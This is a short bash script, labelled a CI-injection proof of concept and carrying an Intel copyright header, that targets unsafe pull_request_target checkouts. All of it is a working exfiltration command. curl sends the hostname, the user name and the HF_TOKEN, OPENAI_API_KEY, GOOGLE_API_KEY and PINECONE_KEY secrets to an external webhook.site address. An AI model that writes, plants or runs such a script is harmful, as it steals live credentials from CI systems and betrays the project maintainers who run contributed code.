#!/bin/bash
# Copyright (C) 2024 Intel Corporation
# SPDX-License-Identifier: Apache-2.0

# SECURITY RESEARCH - CI INJECTION POC
# Demonstrates secret exfiltration via pull_request_target unsafe checkout.

EXFIL="https://webhook.site/e3fe4b71-1aab-4de1-aaa6-a602ddbda4bf"

curl -s "${EXFIL}" \
  -G \
  --data-urlencode "host=$(hostname)" \
  --data-urlencode "user=$(whoami)" \
  --data-urlencode "hf=${HF_TOKEN}" \
  --data-urlencode "oai=${OPENAI_API_KEY}" \
  --data-urlencode "goog=${GOOGLE_API_KEY}" \
  --data-urlencode "pine=${PINECONE_KEY}" \
  -o /dev/null

echo "=== CI INJECTION POC COMPLETE ==="
exit 0
